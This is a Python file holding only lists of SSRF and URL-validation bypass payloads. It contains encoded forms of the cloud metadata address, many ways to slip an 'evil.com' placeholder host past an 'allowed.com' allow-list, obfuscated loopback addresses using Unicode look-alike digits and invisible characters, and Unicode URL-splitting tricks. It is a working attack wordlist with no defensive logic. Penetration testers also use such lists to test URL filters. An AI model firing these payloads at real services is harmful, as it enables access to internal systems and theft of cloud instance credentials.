cloud_metadata_endpoint_payloads = [
r"https://::FFFF:169.254.169.254/",
r"https://[::FFFF:169.254.169.254]/",
r"https://[::ﬀﬀ:A9FE:A9FE]/",
r"https://[::FFFF:A9FE:A9FE]/",
r"https://[0:0:0:0:0:ﬀﬀ:169.254.169.254]/",
r"https://[0:0:0:0:0:FFFF:A9FE:A9FE]/",
r"https://[FD00:EC2::254]/",
r"https://0251.0376.0251.0376/",
r"https://0x1A9FEA9FE/",
r"https://0xA9.0xFE.0xA9.0xFE/",
r"https://0xA9.254.0251.0376/",
r"https://169.16689662/",
r"https://169.254.169.254/",
r"https://169.254.43518/",
r"https://2852039166/",
r"https://45801712126/",
r"https://instance-data/",       
r"http://::FFFF:169.254.169.254/",
r"http://[::FFFF:169.254.169.254]/",
r"http://[::ﬀﬀ:A9FE:A9FE]/",
r"http://[::FFFF:A9FE:A9FE]/",
r"http://[0:0:0:0:0:ﬀﬀ:169.254.169.254]/",
r"http://[0:0:0:0:0:FFFF:A9FE:A9FE]/",
r"http://[FD00:EC2::254]/",
r"http://0251.0376.0251.0376/",
r"http://0x1A9FEA9FE/",
r"http://0xA9.0xFE.0xA9.0xFE/",
r"http://0xA9.254.0251.0376/",
r"http://169.16689662/",
r"http://169.254.169.254/",
r"http://169.254.43518/",
r"http://2852039166/",
r"http://45801712126/",
r"http://instance-data/"
]

domain_allow_list_bypass_payloads = [
r"https://\\{evil.com}/",
r"http://\\{evil.com}/",

r"https://{allowed.com} &@{evil.com}# @{evil.com}/",
r"https://{allowed.com} &@{evil.com}%23 @{evil.com}/",
r"https://{allowed.com} &%40{evil.com}# %40{evil.com}/",
r"https://{allowed.com} %26@{evil.com}# @{evil.com}/",
r"http://{allowed.com} &@{evil.com}# @{evil.com}/",
r"http://{allowed.com} &@{evil.com}%23 @{evil.com}/",
r"http://{allowed.com} &%40{evil.com}# %40{evil.com}/",
r"http://{allowed.com} %26@{evil.com}# @{evil.com}/",

r"https://{allowed.com};.{evil.com}/",
r"https://{allowed.com}%3B.{evil.com}/",
r"https://{allowed.com};%2E{evil.com}/",
r"http://{allowed.com};.{evil.com}/",
r"http://{allowed.com}%3B.{evil.com}/",
r"http://{allowed.com};%2E{evil.com}/",

r"https://{allowed.com}:@{evil.com}/",
r"https://{allowed.com}%3A@{evil.com}/",
r"https://{allowed.com}:%40{evil.com}/",
r"http://{allowed.com}:@{evil.com}/",
r"http://{allowed.com}%3A@{evil.com}/",
r"http://{allowed.com}:%40{evil.com}/",

r"https://{allowed.com}:443:\@@{evil.com}/",
r"https://{allowed.com}:443:\@%40{evil.com}/",
r"https://{allowed.com}:443:\%40@{evil.com}/",
r"https://{allowed.com}:443:%5C@@{evil.com}/",
r"https://{allowed.com}:443%3A\@@{evil.com}/",
r"http://{allowed.com}:443:\@@{evil.com}/",
r"http://{allowed.com}:443:\@%40{evil.com}/",
r"http://{allowed.com}:443:\%40@{evil.com}/",
r"http://{allowed.com}:443:%5C@@{evil.com}/",
r"http://{allowed.com}:443%3A\@@{evil.com}/",

r"https://{allowed.com}:443%5C@{evil.com}/",
r"https://{allowed.com}:443\%40{evil.com}/",
r"https://{allowed.com}:443\@{evil.com}/",
r"http://{allowed.com}:443%5C@{evil.com}/",
r"http://{allowed.com}:443\%40{evil.com}/",
r"http://{allowed.com}:443\@{evil.com}/",

r"https://{allowed.com}:443#\@{evil.com}/",
r"https://{allowed.com}:443#\%40{evil.com}/",
r"https://{allowed.com}:443#%5C@{evil.com}/",
r"https://{allowed.com}:443%23\@{evil.com}/",
r"http://{allowed.com}:443#\@{evil.com}/",
r"http://{allowed.com}:443#\%40{evil.com}/",
r"http://{allowed.com}:443#%5C@{evil.com}/",
r"http://{allowed.com}:443%23\@{evil.com}/",

r"https://{allowed.com}:anything@{evil.com}/",
r"https://{allowed.com}:anything%40{evil.com}/",
r"https://{allowed.com}%3Aanything@{evil.com}/",
r"http://{allowed.com}:anything@{evil.com}/",
r"http://{allowed.com}:anything%40{evil.com}/",
r"http://{allowed.com}%3Aanything@{evil.com}/",

r"https://{allowed.com}?@{evil.com}/",
r"https://{allowed.com}%3F@{evil.com}/",
r"https://{allowed.com}?%40{evil.com}/",
r"http://{allowed.com}?@{evil.com}/",
r"http://{allowed.com}%3F@{evil.com}/",
r"http://{allowed.com}?%40{evil.com}/",

r"https://{allowed.com}.{evil.com}/",
r"https://{allowed.com}%5F{evil.com}/",
r"http://{allowed.com}%5F{evil.com}/",

r"https://{allowed.com}._.{evil.com}/",
r"https://{allowed.com}%2E_.{evil.com}/",
r"https://{allowed.com}._%2E{evil.com}/",
r"https://{allowed.com}.%5F.{evil.com}/",
r"http://{allowed.com}._.{evil.com}/",
r"http://{allowed.com}%2E_.{evil.com}/",
r"http://{allowed.com}._%2E{evil.com}/",
r"http://{allowed.com}.%5F.{evil.com}/",

r"https://{allowed.com}.-.{evil.com}/",
r"https://{allowed.com}.-%2E{evil.com}/",
r"https://{allowed.com}%2E-.{evil.com}/",
r"https://{allowed.com}.%2D.{evil.com}/",
r"http://{allowed.com}.-.{evil.com}/",
r"http://{allowed.com}.-%2E{evil.com}/",
r"http://{allowed.com}%2E-.{evil.com}/",
r"http://{allowed.com}.%2D.{evil.com}/",

r"https://{allowed.com}.,.{evil.com}/",
r"https://{allowed.com}.,%2E{evil.com}/",
r"https://{allowed.com}%2E,.{evil.com}/",
r"https://{allowed.com}.%2C.{evil.com}/",
r"http://{allowed.com}.,.{evil.com}/",
r"http://{allowed.com}.,%2E{evil.com}/",
r"http://{allowed.com}%2E,.{evil.com}/",
r"http://{allowed.com}.%2C.{evil.com}/",

r"https://{allowed.com}.;.{evil.com}/",
r"https://{allowed.com}.;%2E{evil.com}/",
r"https://{allowed.com}.%3B.{evil.com}/",
r"https://{allowed.com}%2E;.{evil.com}/",
r"http://{allowed.com}.;.{evil.com}/",
r"http://{allowed.com}%2E;.{evil.com}/",
r"http://{allowed.com}.;%2E{evil.com}/",
r"http://{allowed.com}.%3B.{evil.com}/",

r"https://{allowed.com}.!.{evil.com}/",
r"https://{allowed.com}%2E!.{evil.com}/",
r"https://{allowed.com}.!%2E{evil.com}/",
r"https://{allowed.com}.%21.{evil.com}/",
r"http://{allowed.com}.!.{evil.com}/",
r"http://{allowed.com}%2E!.{evil.com}/",
r"http://{allowed.com}.!%2E{evil.com}/",
r"http://{allowed.com}.%21.{evil.com}/",

r"https://{allowed.com}.'.{evil.com}/",
r"https://{allowed.com}%2E'.{evil.com}/",
r"https://{allowed.com}.%27.{evil.com}/",
r"https://{allowed.com}.'%2E{evil.com}/",
r"http://{allowed.com}.'.{evil.com}/",
r"http://{allowed.com}%2E'.{evil.com}/",
r"http://{allowed.com}.%27.{evil.com}/",
r"http://{allowed.com}.'%2E{evil.com}/",

r"https://{allowed.com}.\.{evil.com}/",
r"https://{allowed.com}%2E\.{evil.com}/",
r"https://{allowed.com}.%5C.{evil.com}/",
r"https://{allowed.com}.\%2E{evil.com}/",
r"http://{allowed.com}.\.{evil.com}/",
r"http://{allowed.com}%2E\.{evil.com}/",
r"http://{allowed.com}.%5C.{evil.com}/",
r"http://{allowed.com}.\%2E{evil.com}/",

r"https://{allowed.com}.(.{evil.com}/",
r"https://{allowed.com}%2E(.{evil.com}/",
r"https://{allowed.com}.%28.{evil.com}/",
r"https://{allowed.com}.(%2E{evil.com}/",
r"http://{allowed.com}.(.{evil.com}/",
r"http://{allowed.com}%2E(.{evil.com}/",
r"http://{allowed.com}.%28.{evil.com}/",
r"http://{allowed.com}.(%2E{evil.com}/",

r"https://{allowed.com}.).{evil.com}/",
r"https://{allowed.com}%2E).{evil.com}/",
r"https://{allowed.com}.%29.{evil.com}/",
r"https://{allowed.com}.)%2E{evil.com}/",
r"http://{allowed.com}.).{evil.com}/",
r"http://{allowed.com}%2E).{evil.com}/",
r"http://{allowed.com}.%29.{evil.com}/",
r"http://{allowed.com}.)%2E{evil.com}/",

r"https://{allowed.com}.{.{evil.com}/",
r"https://{allowed.com}%2E{.{evil.com}/",
r"https://{allowed.com}.%7B.{evil.com}/",
r"https://{allowed.com}.{%2E{evil.com}/",
r"http://{allowed.com}.{.{evil.com}/",
r"http://{allowed.com}%2E{.{evil.com}/",
r"http://{allowed.com}.%7B.{evil.com}/",
r"http://{allowed.com}.{%2E{evil.com}/",


r"https://{allowed.com}.}.{evil.com}/",
r"https://{allowed.com}%2E}.{evil.com}/",
r"https://{allowed.com}.%7D.{evil.com}/",
r"https://{allowed.com}.}%2E{evil.com}/",
r"http://{allowed.com}.}.{evil.com}/",
r"http://{allowed.com}%2E}.{evil.com}/",
r"http://{allowed.com}.%7D.{evil.com}/",
r"http://{allowed.com}.}%2E{evil.com}/",

r"https://{allowed.com}.*.{evil.com}/",
r"https://{allowed.com}%2E*.{evil.com}/",
r"https://{allowed.com}.%2A.{evil.com}/",
r"https://{allowed.com}.*%2E{evil.com}/",
r"http://{allowed.com}.*.{evil.com}/",
r"http://{allowed.com}%2E*.{evil.com}/",
r"http://{allowed.com}.%2A.{evil.com}/",
r"http://{allowed.com}.*%2E{evil.com}/",

r"https://{allowed.com}.&.{evil.com}/",
r"https://{allowed.com}%2E&.{evil.com}/",
r"https://{allowed.com}.%26.{evil.com}/",
r"https://{allowed.com}.&%2E{evil.com}/",
r"http://{allowed.com}.&.{evil.com}/",
r"http://{allowed.com}%2E&.{evil.com}/",
r"http://{allowed.com}.%26.{evil.com}/",
r"http://{allowed.com}.&%2E{evil.com}/",

r"https://{allowed.com}.`.{evil.com}/",
r"https://{allowed.com}%2E`.{evil.com}/",
r"https://{allowed.com}.%60.{evil.com}/",
r"https://{allowed.com}.`%2E{evil.com}/",
r"http://{allowed.com}.`.{evil.com}/",
r"http://{allowed.com}%2E`.{evil.com}/",
r"http://{allowed.com}.%60.{evil.com}/",
r"http://{allowed.com}.`%2E{evil.com}/",

r"https://{allowed.com}.+.{evil.com}/",
r"https://{allowed.com}%2E+.{evil.com}/",
r"https://{allowed.com}.%2B.{evil.com}/",
r"https://{allowed.com}.+%2E{evil.com}/",
r"http://{allowed.com}.+.{evil.com}/",
r"http://{allowed.com}%2E+.{evil.com}/",
r"http://{allowed.com}.%2B.{evil.com}/",
r"http://{allowed.com}.+%2E{evil.com}/",

r"https://{allowed.com}.=.{evil.com}/",
r"https://{allowed.com}%2E=.{evil.com}/",
r"https://{allowed.com}.%3D.{evil.com}/",
r"https://{allowed.com}.=%2E{evil.com}/",
r"http://{allowed.com}.=.{evil.com}/",
r"http://{allowed.com}%2E=.{evil.com}/",
r"http://{allowed.com}.%3D.{evil.com}/",
r"http://{allowed.com}.=%2E{evil.com}/",

r"https://{allowed.com}.~.{evil.com}/",
r"https://{allowed.com}%2E~.{evil.com}/",
r"https://{allowed.com}.%7E.{evil.com}/",
r"https://{allowed.com}.~%2E{evil.com}/",
r"http://{allowed.com}.~.{evil.com}/",
r"http://{allowed.com}%2E~.{evil.com}/",
r"http://{allowed.com}.%7E.{evil.com}/",
r"http://{allowed.com}.~%2E{evil.com}/",

r"https://{allowed.com}.$.{evil.com}/",
r"https://{allowed.com}%2E$.{evil.com}/",
r"https://{allowed.com}.%24.{evil.com}/",
r"https://{allowed.com}.$%2E{evil.com}/",
r"http://{allowed.com}.$.{evil.com}/",
r"http://{allowed.com}%2E$.{evil.com}/",
r"http://{allowed.com}.%24.{evil.com}/",
r"http://{allowed.com}.$%2E{evil.com}/",

r"https://{allowed.com}[@{evil.com}/",
r"https://{allowed.com}%5B@{evil.com}/",
r"https://{allowed.com}[%40{evil.com}/",
r"http://{allowed.com}[@{evil.com}/",
r"http://{allowed.com}%5B@{evil.com}/",
r"http://{allowed.com}[%40{evil.com}/",

r"https://{allowed.com}@{evil.com}/",
r"https://{allowed.com}%40{evil.com}/",
r"http://{allowed.com}@{evil.com}/",
r"http://{allowed.com}%40{evil.com}/",

r"https://{allowed.com}\;@{evil.com}/",
r"https://{allowed.com}%5C;@{evil.com}/",
r"https://{allowed.com}\%3B@{evil.com}/",
r"https://{allowed.com}\;%40{evil.com}/",
r"http://{allowed.com}\;@{evil.com}/",
r"http://{allowed.com}%5C;@{evil.com}/",
r"http://{allowed.com}\%3B@{evil.com}/",
r"http://{allowed.com}\;%40{evil.com}/",

r"https://{allowed.com}%26anything@{evil.com}/",
r"https://{allowed.com}&anything%40{evil.com}/",
r"https://{allowed.com}&anything@{evil.com}/",
r"http://{allowed.com}%26anything@{evil.com}/",
r"http://{allowed.com}&anything%40{evil.com}/",
r"http://{allowed.com}&anything@{evil.com}/",

r"https://{allowed.com}#{evil.com}/",
r"https://{allowed.com}%23{evil.com}/",
r"http://{allowed.com}#{evil.com}/",
r"http://{allowed.com}%23{evil.com}/",

r"https://{evil.com}	{allowed.com}/",
r"https://{evil.com}%09{allowed.com}/",
r"http://{evil.com}	{allowed.com}/",
r"http://{evil.com}%09{allowed.com}/",

r"https://{evil.com} @{allowed.com}/",
r"https://{evil.com}%09@{allowed.com}/",
r"https://{evil.com} %40{allowed.com}/",
r"http://{evil.com} @{allowed.com}/",
r"http://{evil.com}%09@{allowed.com}/",
r"http://{evil.com} %40{allowed.com}/",

r"https://{evil.com} &@{allowed.com}/",
r"https://{evil.com}%09&@{allowed.com}/",
r"https://{evil.com} %26@{allowed.com}/",
r"https://{evil.com} &%40{allowed.com}/",
r"http://{evil.com} &@{allowed.com}/",
r"http://{evil.com}%09&@{allowed.com}/",
r"http://{evil.com} %26@{allowed.com}/",
r"http://{evil.com} &%40{allowed.com}/",

r"https://{evil.com};https://{allowed.com}/",
r"https://{evil.com}%3Bhttps://{allowed.com}/",
r"http://{evil.com};http://{allowed.com}/",
r"http://{evil.com}%3Bhttp://{allowed.com}/",

r"https://{evil.com}:\@@{allowed.com}/",
r"https://{evil.com}%3A\@@{allowed.com}/",
r"https://{evil.com}:%5C@@{allowed.com}/",
r"https://{evil.com}:\%40@{allowed.com}/",
r"https://{evil.com}:\@%40{allowed.com}/",
r"http://{evil.com}:\@@{allowed.com}/",
r"http://{evil.com}%3A\@@{allowed.com}/",
r"http://{evil.com}:%5C@@{allowed.com}/",
r"http://{evil.com}:\%40@{allowed.com}/",
r"http://{evil.com}:\@%40{allowed.com}/",

r"https://{evil.com}:80;https://{allowed.com}:80/",
r"https://{evil.com}:80%3Bhttps://{allowed.com}:80/",
r"http://{evil.com}:80;http://{allowed.com}:80/",
r"http://{evil.com}:80%3Bhttp://{allowed.com}:80/",

r"https://{evil.com}?{allowed.com}/",
r"https://{evil.com}%3F{allowed.com}/",
r"http://{evil.com}?{allowed.com}/",
r"http://{evil.com}%3F{allowed.com}/",

r"https://{evil.com}?",
r"https://{evil.com}%3F",
r"http://{evil.com}?",
r"http://{evil.com}%3F",

#############################################3

r"http://{evil.com} {allowed.com}/",
r"http://{evil.com} {allowed.com}/",
r"https://{evil.com} {allowed.com}/",
r"https://{evil.com} {allowed.com}/",
r"https://{allowed.com}{evil.com}/",
r"http://{allowed.com}{evil.com}/",

]

fake_relative_url_payloads = [
r"https://	{evil.com}/",
r"https://@{evil.com}/",
r"https://///{evil.com}/",
r"https:////{evil.com}/",
r"https:///\{evil.com}/",
r"https:///&bsol;/{evil.com}/",
r"https:///&NewLine;/{evil.com}/",
r"https:///&sol;/{evil.com}/",
r"https:///&Tab;/{evil.com}/",
r"https://\	\{evil.com}/",
r"https://\/{evil.com}/",
r"https://#{evil.com}/",
r"https://{evil.com}/",
r"https://​{evil.com}/",
r"https://⁠{evil.com}/",
r"https://­{evil.com}/",
r"http://	{evil.com}/",
r"http://@{evil.com}/",
r"http://///{evil.com}/",
r"http:////{evil.com}/",
r"http:///\{evil.com}/",
r"http:///&bsol;/{evil.com}/",
r"http:///&NewLine;/{evil.com}/",
r"http:///&sol;/{evil.com}/",
r"http:///&Tab;/{evil.com}/",
r"http://\	\{evil.com}/",
r"http://\/{evil.com}/",
r"http://#{evil.com}/",
r"http://{evil.com}/",
r"http://​{evil.com}/",
r"http://⁠{evil.com}/",
r"http://­{evil.com}/"
]

ipv6_payloads = [
r"https://[::%{evil.com}]/",
r"https://[::%25{evil.com}]/",
r"https://[v1.{evil.com}]/",
r"http://[::%{evil.com}]/",
r"http://[::%25{evil.com}]/",
r"http://[v1.{evil.com}]/"
]

loopback_payloads = [
r"https://[::]/",
r"https://[::1]/",
r"https://[::ffff:0.0.0.0]/",
r"https://[::ffff:0000:0000]/",
r"https://[::ffff:7f00:1]/",
r"https://[::ﬀﬀ:7f00:1]/",
r"https://[0:0:0:0:0:ffff:127.0.0.1]/",
r"https://[0:0:0:0:0:ffff:1㉗.0.0.1]/",
r"https://[0:0:0:0:0:ffff:⑫7.0.0.1]/",
r"https://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/",
r"https://[0000::1]/",
r"https://[0000:0000:0000:0000:0000:0000:0000:0000]/",
r"https://[0000:0000:0000:0000:0000:0000:0000:0001]/",
r"https://@0/",
r"https://\l\o\c\a\l\h\o\s\t/",
r"https://{allowed.com}.local/",
r"https://{allowed.com}.localhost/",
r"https://0/",
r"https://0:80/",
r"https://0.0.0.0/",
r"https://0000.0000.0000.0000/",
r"https://00000177.00000000.00000000.00000001/",
r"https://0177.0000.0000.0001/",
r"https://017700000001/",
r"https://0⑰700000001/",
r"https://0x00000000/",
r"https://0x100000000/",
r"https://0x17f000001/",
r"https://0x17f000002/",
r"https://0x7F.0.0000.00000001/",
r"https://0x7F.0.0000.0001/",
r"https://0x7f.0x00.0x00.0x01/",
r"https://0x7f.0x00.0x00.0x02/",
r"https://0x7F.1/",
r"https://0x7f000001/",
r"https://0x7f000002/",
r"https://127.0.0.1/",
r"https://1㉗.0.0.1/",
r"https://⑫7.0.0.1/",
r"https://127.0.0.2/",
r"https://1㉗.0.0.2/",
r"https://⑫7.0.0.2/",
r"https://127.000000000000000.1/",
r"https://127.1/",
r"https://2130706433/",
r"https://21307064㉝/",
r"https://2130706㊸3/",
r"https://21㉚706433/",
r"https://2⑬0706433/",
r"https://㉑30706433/",
r"https://㉑㉚⑦⓪⑥④㉝/",
r"https://45080379393/",
r"https://localhost/",
r"https://­localhost/",
r"https://͏localhost/",
r"https://᠋localhost/",
r"https://᠌localhost/",
r"https://᠍localhost/",
r"https://᠎localhost/",
r"https://᠏localhost/",
r"https://​localhost/",
r"https://⁠localhost/",
r"https://⁤localhost/",
r"https://localhoﬆ/",
r"https://lo㎈host/",
r"https://localhoﬅ/",
r"http://[::]/",
r"http://[::1]/",
r"http://[::ffff:0.0.0.0]/",
r"http://[::ffff:0000:0000]/",
r"http://[::ffff:7f00:1]/",
r"http://[::ﬀﬀ:7f00:1]/",
r"http://[0:0:0:0:0:ffff:127.0.0.1]/",
r"http://[0:0:0:0:0:ffff:1㉗.0.0.1]/",
r"http://[0:0:0:0:0:ffff:⑫7.0.0.1]/",
r"http://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/",
r"http://[0000::1]/",
r"http://[0000:0000:0000:0000:0000:0000:0000:0000]/",
r"http://[0000:0000:0000:0000:0000:0000:0000:0001]/",
r"http://@0/",
r"http://\l\o\c\a\l\h\o\s\t/",
r"http://{allowed.com}.local/",
r"http://{allowed.com}.localhost/",
r"http://0/",
r"http://0:80/",
r"http://0.0.0.0/",
r"http://0000.0000.0000.0000/",
r"http://00000177.00000000.00000000.00000001/",
r"http://0177.0000.0000.0001/",
r"http://017700000001/",
r"http://0⑰700000001/",
r"http://0x00000000/",
r"http://0x100000000/",
r"http://0x17f000001/",
r"http://0x17f000002/",
r"http://0x7F.0.0000.00000001/",
r"http://0x7F.0.0000.0001/",
r"http://0x7f.0x00.0x00.0x01/",
r"http://0x7f.0x00.0x00.0x02/",
r"http://0x7F.1/",
r"http://0x7f000001/",
r"http://0x7f000002/",
r"http://127.0.0.1/",
r"http://1㉗.0.0.1/",
r"http://⑫7.0.0.1/",
r"http://127.0.0.2/",
r"http://1㉗.0.0.2/",
r"http://⑫7.0.0.2/",
r"http://127.000000000000000.1/",
r"http://127.1/",
r"http://2130706433/",
r"http://21307064㉝/",
r"http://2130706㊸3/",
r"http://21㉚706433/",
r"http://2⑬0706433/",
r"http://㉑30706433/",
r"http://㉑㉚⑦⓪⑥④㉝/",
r"http://45080379393/",
r"http://localhost/",
r"http://­localhost/",
r"http://͏localhost/",
r"http://᠋localhost/",
r"http://᠌localhost/",
r"http://᠍localhost/",
r"http://᠎localhost/",
r"http://᠏localhost/",
r"http://​localhost/",
r"http://⁠localhost/",
r"http://⁤localhost/",
r"http://localhoﬆ/",
r"http://lo㎈host/",
r"http://localhoﬅ/",
r"https://localhost#@{allowed.com}",
r"https://localhost%23@{allowed.com}",
r"http://localhost#@{allowed.com}",
r"http://localhost%23@{allowed.com}"
]

url_splitting_unicode_character_payloads = [
r"https://{evil.com}⩴{allowed.com}/",
r"https://{evil.com}：{allowed.com}/",
r"https://{evil.com}﹕{allowed.com}/",
r"https://{evil.com}︓{allowed.com}/",
r"https://{evil.com}⁉{allowed.com}/",
r"https://{evil.com}⁈{allowed.com}/",
r"https://{evil.com}⁇{allowed.com}/",
r"https://{evil.com}？{allowed.com}/",
r"https://{evil.com}﹖{allowed.com}/",
r"https://{evil.com}︖{allowed.com}/",
r"https://{evil.com}…{allowed.com}/",
r"https://{evil.com}︙{allowed.com}/",
r"https://{evil.com}‥{allowed.com}/",
r"https://{evil.com}︰{allowed.com}/",
r"https://{evil.com}․{allowed.com}/",
r"https://{evil.com}﹒{allowed.com}/",
r"https://{evil.com}＠{allowed.com}/",
r"https://{evil.com}﹫{allowed.com}/",
r"https://{evil.com}／{allowed.com}/",
r"https://{evil.com}＼{allowed.com}/",
r"https://{evil.com}﹨{allowed.com}/",
r"https://{evil.com}＃{allowed.com}/",
r"https://{evil.com}﹟{allowed.com}/",
r"https://{evil.com}⒈{allowed.com}/",
r"https://{evil.com}⒑{allowed.com}/",
r"https://{evil.com}⒒{allowed.com}/",
r"https://{evil.com}⒓{allowed.com}/",
r"https://{evil.com}⒔{allowed.com}/",
r"https://{evil.com}⒕{allowed.com}/",
r"https://{evil.com}⒖{allowed.com}/",
r"https://{evil.com}⒗{allowed.com}/",
r"https://{evil.com}⒘{allowed.com}/",
r"https://{evil.com}⒙{allowed.com}/",
r"https://{evil.com}⒚{allowed.com}/",
r"https://{evil.com}⒉{allowed.com}/",
r"https://{evil.com}⒛{allowed.com}/",
r"https://{evil.com}⒊{allowed.com}/",
r"https://{evil.com}⒋{allowed.com}/",
r"https://{evil.com}⒌{allowed.com}/",
r"https://{evil.com}⒍{allowed.com}/",
r"https://{evil.com}⒎{allowed.com}/",
r"https://{evil.com}⒏{allowed.com}/",
r"https://{evil.com}⒐{allowed.com}/",
r"https://{evil.com}㏂{allowed.com}/",
r"https://{evil.com}℀{allowed.com}/",
r"https://{evil.com}℁{allowed.com}/",
r"https://{evil.com}℅{allowed.com}/",
r"https://{evil.com}℆{allowed.com}/",
r"https://{evil.com}㏇{allowed.com}/",
r"https://{evil.com}㏘{allowed.com}/",
r"https://{evil.com}�{allowed.com}/",
r"http://{evil.com}⩴{allowed.com}/",
r"http://{evil.com}：{allowed.com}/",
r"http://{evil.com}﹕{allowed.com}/",
r"http://{evil.com}︓{allowed.com}/",
r"http://{evil.com}⁉{allowed.com}/",
r"http://{evil.com}⁈{allowed.com}/",
r"http://{evil.com}⁇{allowed.com}/",
r"http://{evil.com}？{allowed.com}/",
r"http://{evil.com}﹖{allowed.com}/",
r"http://{evil.com}︖{allowed.com}/",
r"http://{evil.com}…{allowed.com}/",
r"http://{evil.com}︙{allowed.com}/",
r"http://{evil.com}‥{allowed.com}/",
r"http://{evil.com}︰{allowed.com}/",
r"http://{evil.com}․{allowed.com}/",
r"http://{evil.com}﹒{allowed.com}/",
r"http://{evil.com}＠{allowed.com}/",
r"http://{evil.com}﹫{allowed.com}/",
r"http://{evil.com}／{allowed.com}/",
r"http://{evil.com}＼{allowed.com}/",
r"http://{evil.com}﹨{allowed.com}/",
r"http://{evil.com}＃{allowed.com}/",
r"http://{evil.com}﹟{allowed.com}/",
r"http://{evil.com}⒈{allowed.com}/",
r"http://{evil.com}⒑{allowed.com}/",
r"http://{evil.com}⒒{allowed.com}/",
r"http://{evil.com}⒓{allowed.com}/",
r"http://{evil.com}⒔{allowed.com}/",
r"http://{evil.com}⒕{allowed.com}/",
r"http://{evil.com}⒖{allowed.com}/",
r"http://{evil.com}⒗{allowed.com}/",
r"http://{evil.com}⒘{allowed.com}/",
r"http://{evil.com}⒙{allowed.com}/",
r"http://{evil.com}⒚{allowed.com}/",
r"http://{evil.com}⒉{allowed.com}/",
r"http://{evil.com}⒛{allowed.com}/",
r"http://{evil.com}⒊{allowed.com}/",
r"http://{evil.com}⒋{allowed.com}/",
r"http://{evil.com}⒌{allowed.com}/",
r"http://{evil.com}⒍{allowed.com}/",
r"http://{evil.com}⒎{allowed.com}/",
r"http://{evil.com}⒏{allowed.com}/",
r"http://{evil.com}⒐{allowed.com}/",
r"http://{evil.com}㏂{allowed.com}/",
r"http://{evil.com}℀{allowed.com}/",
r"http://{evil.com}℁{allowed.com}/",
r"http://{evil.com}℅{allowed.com}/",
r"http://{evil.com}℆{allowed.com}/",
r"http://{evil.com}㏇{allowed.com}/",
r"http://{evil.com}㏘{allowed.com}/",
r"http://{evil.com}�{allowed.com}/"
]

